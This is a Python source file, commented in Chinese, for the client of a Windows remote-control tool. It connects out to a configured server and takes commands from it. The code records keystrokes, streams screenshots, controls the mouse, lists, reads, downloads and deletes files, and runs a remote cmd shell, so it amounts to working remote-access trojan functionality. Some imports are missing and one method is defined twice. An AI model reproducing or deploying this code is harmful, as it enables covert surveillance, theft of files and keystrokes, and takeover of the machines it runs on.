import os
from platform import platform, machine, processor  # 获取系统信息
import psutil  # 系统资源监控
import ctypes  # Windows API调用
import random  # 随机数生成
import _ctypes  # C类型支持
import win32api  # Windows API封装
import win32con  # Windows常量
import threading  # 多线程支持
from PIL import Image, ImageGrab  # 图像处理
from time import time, sleep  # 时间相关
from io import BytesIO  # 内存字节流
from typing import Callable, Optional  # 类型提示
from os import remove  # 文件删除
from pynput import keyboard  # 键盘监听
from msvcrt import get_osfhandle  # 获取文件句柄
from base64 import b64encode, b64decode  # Base64编解码
from subprocess import Popen, PIPE, STDOUT  # 子进程管理
from _winapi import PeekNamedPipe, ReadFile  # Windows管道操作
from dxcampil import create as create_camera  # 高性能截图库

from libs.packets import *  # 数据包相关
from libs.action import *  # 动作管理
from libs.config import *  # 配置管理

# 固定设置项
ERROR_DEBUG = True  # 启用错误调试模式

def random_hex(length: int) -> str:
    """生成随机16进制字符串"""
    return hex(int.from_bytes(random.randbytes(length), "big"))[2:]

class ClientStopped(BaseException):
    """客户端停止异常"""
    pass

class ClientRestart(BaseException):
    """客户端重启异常"""
    pass

class TimerLoop:
    """定时循环执行器"""
    def __init__(self, interval: float, checker: Callable[[], bool], callback: Callable[[], None]):
        """
        初始化定时器
        :param interval: 检查间隔(秒)
        :param checker: 检查函数，返回True时执行回调
        :param callback: 回调函数
        """
        self.interval = interval  # 检查间隔
        self.checker = checker  # 条件检查函数
        self.callback = callback  # 回调函数
        self.ran = False  # 是否已运行过
        self.running = False  # 是否正在运行
        self.timer = None  # 定时器对象
        self.lock = threading.Lock()  # 线程锁

    def start(self):
        """启动定时器"""
        with self.lock:
            if not self.running:
                self.timer = threading.Timer(self.interval, self.checking)
                self.timer.start()
                self.running = True

    def checking(self):
        """定时检查并执行回调"""
        with self.lock:
            if self.checker():  # 检查条件
                if not self.ran:  # 如果尚未运行
                    self.callback()  # 执行回调
                    self.ran = True
            else:
                self.ran = False  # 重置运行状态
            
            if self.running:  # 继续下一次检查
                self.timer = threading.Timer(self.interval, self.checking)
                self.timer.start()

    def pause(self, pause: bool = True):
        """暂停/恢复定时器"""
        with self.lock:
            if pause and self.running:  # 暂停
                self.timer.cancel()
                self.running = False
            elif not pause and not self.running:  # 恢复
                self.timer = threading.Timer(self.interval, self.checking)
                self.timer.start()
                self.running = True

    def stop(self):
        """停止定时器"""
        with self.lock:
            self.timer.cancel()
            self.running = False

class ActionManager:
    """动作管理器，用于管理定时任务"""
    def __init__(self):
        self.actions: dict[str, tuple[TheAction, TimerLoop]] = {}  # 存储所有动作

    def add_action(self, action: TheAction) -> str:
        """添加一个定时任务"""
        print(action.build_packet())
        uuid = random_hex(8)  # 生成唯一ID
        timer_loop = TimerLoop(action.check_inv, action.check, action.execute)
        timer_loop.start()
        self.actions[uuid] = (action, timer_loop)
        return uuid  # 返回任务ID

    def stop2clear(self):
        """停止所有定时任务并清空"""
        for _, timer in self.actions.values():
            timer.stop()
        self.actions.clear()

class Client:
    """主客户端类"""
    def __init__(self, config: Config) -> None:
        """初始化客户端"""
        self.config = config  # 配置对象
        self.host = config.host  # 服务器地址
        self.port = config.port  # 服务器端口
        self.uuid = config.uuid  # 客户端唯一标识
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 套接字
        
        # 鼠标按键映射
        self.mouse_key_map = {
            "left": (win32con.MOUSEEVENTF_LEFTDOWN, win32con.MOUSEEVENTF_LEFTUP),
            "middle": (win32con.MOUSEEVENTF_MIDDLEDOWN, win32con.MOUSEEVENTF_MIDDLEUP),
            "right": (win32con.MOUSEEVENTF_RIGHTDOWN, win32con.MOUSEEVENTF_RIGHTUP),
        }
        
        self.log_stack = {}  # 日志堆栈
        self.__connected = False  # 连接状态
        self.threads: list[Thread] = []  # 线程列表
        self.system_info = self.get_system_info()  # 系统信息

        # 屏幕传输相关
        self.sending_screen = False  # 是否发送屏幕
        self.screen_fps = 10  # 发送屏幕帧率
        self.shell_stop_flag = False  # 是否停止shell
        self.screen_format: str = ScreenFormat.JPEG  # 屏幕传输格式
        self.screen_quality = 80  # JPEG质量
        self.pre_scaled = True  # 是否预缩放
        self.screen_size: tuple[int, int] = (860, 540)  # 预缩放大小
        
        try:
            self.camera = create_camera()  # 尝试使用dxcam截图
            self.use_dxcam = True
        except Exception as e:
            print(f"无法初始化dxcam相机，将使用PIL.ImageGrab替代: {e}")
            self.camera = None
            self.use_dxcam = False
            
        self.key_listener = None  # 键盘监听器
        self.shell_thread_running = False  # shell线程运行状态
        self.shell: Popen = None  # shell进程

        self.packet_manager = PacketManager(self.connected)  # 数据包管理器
        self.action_manager = ActionManager()  # 动作管理器
        print("客户端初始化完成")

    def log(self, *values: object):
        """记录日志"""
        text = " ".join(map(str, values))
        self.log_stack[time()] = text
        print(text)

    def log_send_thread(self):
        """日志发送线程"""
        while self.connected:
            for i in range(10):  # 每次最多发送10条日志
                try:
                    min_time = min(self.log_stack.keys())  # 获取最早的日志
                    text = self.log_stack.pop(min_time)
                    packet_data = {
                        "type": "log",
                        "level": "info",
                        "text": text,
                        "time": time(),
                    }
                    self.send_packet(packet_data)
                except (KeyError, ValueError):  # 没有日志可发送
                    break
            sleep(0.1)  # 短暂休眠

    def start(self) -> None:
        """启动客户端主循环"""
        print("启动客户端")
        print("开始尝试连接至服务器")
        self.connect_until()  # 持续尝试连接
        self.log("成功连接至服务器!")
        self.sock.sendall(int(self.uuid, 16).to_bytes(8, "big"))  # 发送UUID
        
        # 启动各种线程
        self.shell_thread = start_and_return(self.shell_output_thread)
        self.threads.append(self.shell_thread)
        self.threads.append(start_and_return(self.log_send_thread))
        self.threads.append(start_and_return(self.packet_send_thread))
        self.threads.append(start_and_return(self.connection_init))
        self.threads.append(start_and_return(self.screen_send_thread))

        # 主循环
        while self.connected:
            try:
                length, packet = self.recv_packet()  # 接收数据包
            except ConnectionError:
                self.connected = False
                break
                
            if packet is None:  # 无数据包
                print("\r没有接收到数据包", end="")
                sleep(0.001)
                continue
                
            if packet["type"] != PING:  # 非PING包打印日志
                print("接收到数据包:", packet_str(packet))
                
            if not self.parse_packet(packet):  # 解析数据包
                raise ClientStopped
                
        # 清理工作
        if self.config.record_key:
            self.key_listener.stop()
        print("停止")
        for thread in self.threads:
            thread.join()

    def connection_init(self):
        """初始化连接，发送基本信息"""
        drives = self.get_available_drives()  # 获取驱动器列表
        packets = [
            {"type": HOST_NAME, "name": socket.gethostname()},  # 主机名
            self.get_screen_packet(),  # 屏幕截图
            {"type": "drive_list", "drives": drives},  # 驱动器列表
            {"type": "system_info", "info": self.system_info}  # 系统信息
        ]
        for packet in packets:
            if packet:
                self.send_packet(packet)

    def get_screen_packet(self) -> Optional[Packet]:
        """获取屏幕截图数据包"""
        cost = perf_counter()
        try:
            if self.use_dxcam:  # 使用dxcam截图
                try:
                    screen = self.camera.grab()
                except _ctypes.COMError:
                    print("dxcam相机错误，切换到ImageGrab")
                    self.use_dxcam = False
                    screen = ImageGrab.grab()
            else:  # 使用PIL截图
                screen = ImageGrab.grab()
        except Exception as e:
            print(f"截图失败: {e}")
            return None
            
        if screen is None:
            return None
            
        cost2 = perf_counter()

        if self.pre_scaled:  # 预缩放处理
            scale = max(
                screen.size[0] / self.screen_size[0],
                screen.size[1] / self.screen_size[1],
            )
            new_width = int(screen.size[0] / scale)
            new_height = int(screen.size[1] / scale)
            screen = screen.resize((new_width, new_height), Image.BOX)
            
        cost3 = perf_counter()
        fmt = self.screen_format[:]  # 获取格式
        
        # 根据格式编码图像
        if fmt == ScreenFormat.JPEG:
            image_io = BytesIO()
            screen.save(image_io, format="JPEG", quality=self.screen_quality)
        elif fmt == ScreenFormat.PNG:
            image_io = BytesIO()
            screen.save(image_io, format="PNG")
        elif fmt == ScreenFormat.RAW:
            image_io = BytesIO()
            image_io.write(screen.tobytes())
        else:  # 默认回退到JPEG
            self.screen_format = ScreenFormat.JPEG
            return self.get_screen_packet()
            
        cost4 = perf_counter()
        image_bytes = image_io.getvalue()
        image_text = b64encode(image_bytes).decode("utf-8")  # Base64编码
        
        # 构建数据包
        packet = {
            "type": SCREEN,
            "size": screen.size,
            "format": fmt,
            "pre_scale": self.pre_scaled,
            "data": image_text,
        }
        return packet

    def screen_send_thread(self):
        """屏幕发送线程"""
        last_send = perf_counter()
        while self.connected:
            try:
                if not self.sending_screen:  # 未启用屏幕发送
                    sleep(0.1)
                    continue
                    
                current_time = perf_counter()
                time_since_last = current_time - last_send
                target_interval = 1 / self.screen_fps  # 计算目标间隔
                
                if time_since_last < target_interval:  # 控制帧率
                    sleep(target_interval - time_since_last)
                    continue
                    
                last_send = current_time
                packet = self.get_screen_packet()  # 获取屏幕数据包
                if packet is None:
                    sleep(0.1)
                    continue
                    
                self.send_packet(packet, True)  # 发送数据包
            except Exception as e:
                print(f"屏幕传输线程错误: {e}")
                sleep(1)

    def run_infinitely(self) -> bool:
        """无限运行循环，需要退出时返回False"""
        while True:
            try:
                if ERROR_DEBUG:  # 调试模式
                    self.start()
                    continue
                try:
                    self.start()
                except Exception:
                    print("遇到未捕获的错误: 重启客户端")
                    break
            except KeyboardInterrupt:  # 用户中断
                print("运行被用户终止")
                self.connected = False
                return False

    def parse_packet(self, packet: Packet) -> bool:
        """解析数据包，返回False表示需要退出"""
        if packet["type"] == SET_MOUSE_POS:  # 设置鼠标位置
            win32api.SetCursorPos((packet["x"], packet["y"]))
        elif packet["type"] == SET_MOUSE_BUTTON:  # 设置鼠标按键状态
            mouse_flag = self.mouse_key_map[packet["button"]][packet["state"]]
            win32api.mouse_event(packet["x"], packet["y"], 0, mouse_flag)
        elif packet["type"] == FILE_DOWNLOAD:  # 文件下载
            start_and_return(self.file_download_thread, (packet,))
        elif packet["type"] == FILE_ATTRIBUTES:  # 获取文件属性
            start_and_return(self.get_file_attributes, (packet,))
        elif packet["type"] == SET_SCREEN_FORMAT:  # 设置屏幕格式
            self.screen_format = packet["format"]
        elif packet["type"] == SET_SCREEN_FPS:  # 设置屏幕帧率
            self.screen_fps = packet["fps"]
        elif packet["type"] == SET_SCREEN_SIZE:  # 设置屏幕大小
            self.screen_size = packet["size"]
        elif packet["type"] == SET_PRE_SCALE:  # 设置预缩放
            self.pre_scaled = packet["enable"]
        elif packet["type"] == SET_SCREEN_QUALITY:  # 设置屏幕质量
            self.screen_quality = packet["quality"]
        elif packet["type"] == SET_SCREEN_SEND:  # 设置是否发送屏幕
            self.sending_screen = packet["enable"]
        elif packet["type"] == GET_SCREEN:  # 获取屏幕截图
            restore = False
            if not self.pre_scaled:
                restore = True
                self.pre_scaled = True
                self.screen_size = packet["size"]
            screen_packet = self.get_screen_packet()
            if restore:
                self.pre_scaled = False
            if screen_packet is not None:
                self.send_packet(screen_packet)

        elif packet["type"] == REQ_LIST_DIR:  # 请求目录列表
            packet = self.get_files_packet(packet["path"])
            self.send_packet(packet)
        elif packet["type"] == FILE_VIEW:  # 查看文件内容
            start_and_return(self.file_view_thread, (packet,))
        elif packet["type"] == FILE_DELETE:  # 删除文件
            remove(packet["path"])
        elif packet["type"] == SHELL_INIT:  # 初始化shell
            self.restore_shell()
        elif packet["type"] == SHELL_INPUT:  # shell输入
            try:
                self.shell.stdin.write(b64decode(packet["text"]))
                self.shell.stdin.flush()
            except OSError:
                self.send_packet({"type": SHELL_BROKEN})
        elif packet["type"] == PING:  # ping包
            self.send_packet({"type": "pong", "timer": packet["timer"]}, priority=Priority.HIGHEST)
        elif packet["type"] == STATE_INFO:  # 状态信息
            self.sending_screen = packet["video_mode"]
            self.screen_fps = packet["monitor_fps"]
            self.screen_quality = packet["video_quality"]
        elif packet["type"] == ACTION_ADD:  # 添加动作
            self.action_manager.add_action(TheAction.from_packet(packet))
        elif packet["type"] == CLIENT_RESTART:  # 客户端重启
            raise ClientRestart
        elif packet["type"] == CHANGE_ADDRESS:  # 更改服务器地址
            self.config.host_changed = [self.config.host, self.config.port].copy()
            self.config.host = packet["host"]
            self.config.port = packet["port"]
            self.config.save_config()
        elif packet["type"] == CHANGE_CONFIG:  # 更改配置
            setattr(self.config, packet["key"], packet["value"])
        elif packet["type"] == REQ_CONFIG:  # 请求配置
            self.send_packet({"type": CONFIG_RESULT, "config": self.config.raw_config})
        return True  # 继续运行

    def file_view_thread(self, packet: Packet):
        """文件查看线程"""
        file_block = self.config.file_block  # 文件块大小
        path = packet["path"]  # 文件路径
        data_max_size = packet["data_max_size"]  # 最大数据大小

        # 错误数据包模板
        error_packet = {"type": FILE_VIEW_ERROR, "path": path, "error": "未知错误"}
        
        try:
            # 尝试打开并读取文件
            with open(path, "rb") as file:
                data = file.read(data_max_size)
        except FileNotFoundError:
            error_packet["error"] = "文件不存在"
            self.send_packet(error_packet)
            return
        except PermissionError:
            error_packet["error"] = "权限不足"
            self.send_packet(error_packet)
            return
        except OSError:
            self.send_packet(error_packet)
            return

        # 生成随机cookie标识本次文件传输
        cookie = hex(int.from_bytes(random.randbytes(8), "big"))[2:]
        
        # 发送文件查看开始包
        packet = {"type": FILE_VIEW_CREATE, "path": path, "cookie": cookie}
        self.send_packet(packet)
        
        # 分块发送文件数据
        for block in [data[i : i + file_block] for i in range(0, len(data), file_block)]:
            packet = {
                "type": FILE_VIEW_DATA,
                "path": path,
                "data": b64encode(block).decode("utf-8"),
                "cookie": cookie,
            }
            self.send_packet(packet, priority=Priority.NORMAL)
            
        # 发送文件查看结束包
        packet = {"type": FILE_VIEW_OVER, "path": path, "cookie": cookie}
        self.send_packet(packet, priority=Priority.LOWER)

    def shell_output_thread(self):
        """shell输出线程"""
        self.shell_thread_running = True
        print("终端输出线程启动")
        try:
            while self.connected and (not self.shell_stop_flag):
                try:
                    output = self.get_output()  # 获取shell输出
                    if output:
                        packet = {"type": SHELL_OUTPUT, "output": output}
                        self.send_packet(packet, priority=Priority.NORMAL)
                except BrokenPipeError:  # 管道破裂
                    self.send_packet({"type": SHELL_BROKEN})
                    break
                except OSError:
                    break
        except Exception as e:
            print(e)
        print("终端输出线程停止")
        self.shell_thread_running = False

    def get_output(self) -> str:
        """获取shell进程输出"""
        output = ""
        handle = get_osfhandle(self.shell.stdout.fileno())  # 获取文件句柄
        avail_count, _ = PeekNamedPipe(handle, 0)  # 检查管道中是否有数据
        
        if avail_count > 0:
            output, _ = ReadFile(handle, avail_count)  # 读取数据
            output = output.decode("cp936", "ignore")  # 解码输出(使用中文编码)

        return output if bool(output) else ""  # 返回非空输出

    def connect_until(self):
        """持续尝试连接服务器"""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        host_changed: list[str, int] | None = self.config.host_changed  # 服务器地址是否变更过
        reconnect_time = self.config.reconnect_time  # 重连等待时间
        
        while not self.connected:
            if self.try_connect():  # 尝试连接
                break
                
            # 如果服务器地址变更过，恢复原地址
            if host_changed is not None:
                self.config.host = host_changed[0]
                self.config.port = host_changed[1]
                self.config.host_changed = False
                self.config.save_config()
                
            # 等待重连
            self.scroll_sleep(reconnect_time, "连接失败, 等待{}秒后重连: {}s")
            
            # 指数退避算法增加重连时间
            if self.config.timeout_add:
                reconnect_time *= self.config.timeout_add_multiplier
            reconnect_time = int(reconnect_time)
            if reconnect_time > 60:  # 最大等待60秒
                reconnect_time = 60
                
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 创建新socket

    def on_key_press(self, key):
        """键盘按下事件回调"""
        start_and_return(self._on_key_press, (key,))  # 在新线程中处理

    def _on_key_press(self, key):
        """实际处理键盘事件的函数"""
        if isinstance(key, keyboard.Key):  # 特殊按键
            s = key.name
            if key == keyboard.Key.space:  # 空格键特殊处理
                s = " "
        elif isinstance(key, keyboard.KeyCode):  # 普通按键
            if key.char is not None:
                s = key.char
            else:
                try:
                    s = chr(key.vk - 48)  # 尝试转换键码
                except ValueError:
                    s = "Error"
        else:
            return
            
        # 发送按键事件包
        packet = {"type": KEY_EVENT, "key": s}
        self.send_packet(packet)

    @staticmethod
    def get_files_packet(path: str) -> Packet:
        """获取目录列表数据包"""
        try:
            # 规范化路径
            path = os.path.normpath(path)
            
            # 检查路径是否存在
            if not os.path.exists(path):
                return {
                    "type": DIR_LIST_RESULT,
                    "path": path,
                    "dirs": [],
                    "files": [],
                    "error": "路径不存在"
                }
                
            # 确保路径包含盘符前缀
            if not path.startswith(('C:', 'D:', 'E:', 'F:', 'G:', 'H:', 'I:', 'J:', 'K:', 'L:', 'M:', 
                                 'N:', 'O:', 'P:', 'Q:', 'R:', 'S:', 'T:', 'U:', 'V:', 'W:', 'X:', 'Y:', 'Z:')):
                path = 'C:/' + path.lstrip('/')
            
            # 检查路径是否存在
            if not os.path.exists(path):
                print(f"路径不存在: {path}")
                return {
                    "type": DIR_LIST_RESULT,
                    "path": path,
                    "dirs": [],
                    "files": []
                }
                
            # 检查是否是目录
            if not os.path.isdir(path):
                print(f"路径不是目录: {path}")
                return {
                    "type": DIR_LIST_RESULT,
                    "path": path,
                    "dirs": [],
                    "files": []
                }
                
            # 获取目录内容
            dirs = []
            files = []
            try:
                with os.scandir(path) as entries:  # 使用scandir更高效
                    for entry in entries:
                        if entry.is_dir():
                            dirs.append(entry.name)
                        elif entry.is_file():
                            files.append(entry.name)
            except Exception as e:
                print(f"扫描目录失败: {e}")
                # 回退到os.listdir
                try:
                    for name in os.listdir(path):
                        full_path = os.path.join(path, name)
                        if os.path.isdir(full_path):
                            dirs.append(name)
                        else:
                            files.append(name)
                except Exception as e:
                    print(f"回退方法也失败: {e}")
                    raise
                    
            # 统一路径格式
            normalized_path = path.replace('\\', '/').replace('//', '/')
            
            print(f"成功获取目录列表: {normalized_path} (目录: {len(dirs)}, 文件: {len(files)})")
            
            return {
                "type": DIR_LIST_RESULT,
                "path": normalized_path,
                "dirs": dirs,
                "files": files
            }
            
        except Exception as e:
            print(f"获取目录列表时发生严重错误: {e}")
            return {
                "type": DIR_LIST_RESULT,
                "path": path,
                "dirs": [],
                "files": []
            }

    @staticmethod
    def scroll_sleep(waits: float, text: str):
        """带滚动显示的等待"""
        timer = time()
        while timer + waits > time():
            sleep(0.1)
            print("\r" + text.format(waits, round(time() - timer, 1)), end="")
        print("\r" + text.format(waits, waits) + "   ")

    @staticmethod
    def get_available_drives() -> list[str]:
        """获取所有可用盘符"""
        drives = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()  # 获取逻辑驱动器位掩码
        for i in range(26):  # 检查A-Z驱动器
            if bitmask & (1 << i):
                drives.append(f"{chr(65 + i)}:")  # 添加可用驱动器
        return drives

    def init_var(self):
        """初始化变量"""
        self.sending_screen = False  # 重置屏幕发送状态
        self.screen_fps = 15  # 重置帧率
        self.shell_stop_flag = False  # 重置shell停止标志
        self.screen_format: str = ScreenFormat.JPEG  # 重置屏幕格式
        self.screen_quality = 80  # 重置质量
        self.pre_scaled = True  # 重置预缩放
        self.screen_size: tuple[int, int] = (960, 540)  # 重置屏幕大小
        self.key_listener = keyboard.Listener(on_press=self.on_key_press)  # 重新初始化键盘监听
        self.action_manager.stop2clear()  # 清除所有动作
        self.shell_thread_running = False  # 重置shell线程状态
        
        # 终止现有shell进程
        if getattr(self, "shell", None):
            self.shell.terminate()
            
        # 启动新的shell进程
        self.shell = Popen(
            ["cmd"],  # Windows命令提示符
            stdin=PIPE,  # 标准输入管道
            stdout=PIPE,  # 标准输出管道
            stderr=STDOUT,  # 标准错误重定向到标准输出
            shell=True,
            universal_newlines=False,  # 不使用文本模式
        )

    def restore_shell(self):
        """恢复shell会话"""
        if getattr(self, "shell", None):
            self.shell.terminate()  # 终止现有shell
            self.shell_stop_flag = True  # 设置停止标志
            self.shell_thread.join()  # 等待shell线程结束
            self.shell_stop_flag = False  # 重置停止标志
            
        # 启动新的shell进程
        self.shell = Popen(
            ["cmd"],
            stdin=PIPE,
            stdout=PIPE,
            stderr=STDOUT,
            shell=True,
            universal_newlines=False,
        )
        
        # 如果shell线程未运行，则启动
        if not self.shell_thread_running:
            self.shell_thread = start_and_return(self.shell_output_thread)

    def try_connect(self) -> bool:
        """尝试连接服务器"""
        try:
            print("尝试连接至服务器")
            self.sock.settimeout(self.config.connect_timeout)  # 设置连接超时
            self.sock.connect((self.host, self.port))  # 连接服务器
            
            # 初始化各种管理器
            self.packet_manager.init_stack()
            self.init_var()
            self.sock.settimeout(1)  # 重置超时为1秒
            self.packet_manager.set_socket(self.sock)
            
            # 启动键盘监听
            if self.config.record_key:
                self.key_listener.start()
                
            self.connected = True
            return True
        except ConnectionError as e:
            print("连接时发生错误:", e)
            self.connected = False
            return False
        except TimeoutError:
            print("连接超时")
            self.connected = False
            return False

    def packet_send_thread(self):
        """数据包发送线程"""
        self.packet_manager.packet_send_thread()

    def send_packet(
        self,
        packet: Packet,
        loss_enable: bool = False,
        priority: int = Priority.HIGHER,
    ) -> None:
        """发送数据包"""
        if packet["type"] != SCREEN and packet["type"] != PONG:  # 非屏幕/PONG包打印日志
            print("发送数据包:", packet_str(packet))
        self.packet_manager.send_packet(packet, loss_enable, priority)

    def recv_packet(self) -> tuple[int, None] | tuple[int, Packet]:
        """接收数据包"""
        return self.packet_manager.recv_packet()

    def stop(self):
        """停止客户端"""
        print("停止客户端...")
        self.sock.close()  # 关闭socket
        
        # 终止shell进程
        if self.shell:
            self.shell.terminate()
            
        self.connected = False  # 设置连接状态为False
        
        # 清理dxcam资源
        if hasattr(self, 'use_dxcam') and self.use_dxcam:
            try:
                if self.camera is not None:
                    del self.camera
            except (OSError, AttributeError):
                pass

    @staticmethod
    def get_available_drives() -> list[str]:
        """获取所有可用盘符(静态方法版本)"""
        drives = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for i in range(26):
            if bitmask & (1 << i):
                drives.append(f"{chr(65 + i)}:")
        return drives
    
    def get_system_info(self) -> dict:
        """获取系统信息"""
        return {
            "os": platform(),  # 操作系统信息
            "arch": machine(),  # 系统架构
            "cpu": processor() or "Unknown",  # CPU信息
            "ram": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",  # 内存大小
            "cores": psutil.cpu_count(logical=False),  # 物理核心数
            "threads": psutil.cpu_count(logical=True)  # 逻辑处理器数
        }
    
    def file_download_thread(self, packet: Packet):
        """文件下载线程"""
        path = packet["path"]  # 文件路径
        try:
            with open(path, "rb") as file:
                file_size = os.path.getsize(path)  # 获取文件大小
                chunk_size = self.config.file_block  # 分块大小
                cookie = random_hex(8)  # 随机cookie
                
                # 发送文件下载开始包
                self.send_packet({
                    "type": FILE_DOWNLOAD_START,
                    "path": path,
                    "size": file_size,
                    "cookie": cookie
                })
                
                # 分块读取并发送文件
                while True:
                    data = file.read(chunk_size)
                    if not data:  # 文件结束
                        break
                    self.send_packet({
                        "type": FILE_DOWNLOAD_DATA,
                        "data": b64encode(data).decode("utf-8"),
                        "cookie": cookie
                    }, priority=Priority.LOWER)  # 低优先级发送
                
                # 发送下载结束包
                self.send_packet({
                    "type": FILE_DOWNLOAD_END,
                    "cookie": cookie
                })
                
        except Exception as e:
            self.send_packet({
                "type": FILE_DOWNLOAD_ERROR,
                "path": path,
                "error": str(e)
            })

    def get_file_attributes(self, packet: Packet):
        """获取文件属性"""
        path = packet["path"]
        try:
            stat = os.stat(path)  # 获取文件状态
            attributes = {
                "path": path,
                "size": stat.st_size,  # 文件大小
                "created": stat.st_ctime,  # 创建时间
                "modified": stat.st_mtime,  # 修改时间
                "is_dir": os.path.isdir(path)  # 是否是目录
            }
            self.send_packet({
                "type": FILE_ATTRIBUTES_RESULT,
                "attributes": attributes
            })
        except Exception as e:
            self.send_packet({
                "type": FILE_ATTRIBUTES_ERROR,
                "path": path,
                "error": str(e)
            })

    @property
    def connected(self):
        """连接状态属性(getter)"""
        return self.__connected

    @connected.setter
    def connected(self, value: bool):
        """连接状态属性(setter)"""
        self.__connected = value
        self.packet_manager.connected = value  # 同时更新packet_manager的状态

def main():
    """主函数"""
    while True:
        try:
            # 清理现有客户端
            try:
                client.stop()
                del client
            except NameError:  # client未定义
                pass

            # 创建新客户端
            config = Config()
            client = Client(config)

            try:
                ret = client.run_infinitely()  # 运行客户端主循环
                if ret == False:  # 需要退出
                    break
            except ClientStopped:  # 服务端停止客户端
                print("客户端被服务端停止")
                break
            except ClientRestart:  # 需要重启
                pass
        finally:
            pass

if __name__ == "__main__":
    """程序入口"""
    while True:
        try:
            main()
        finally:
            pass

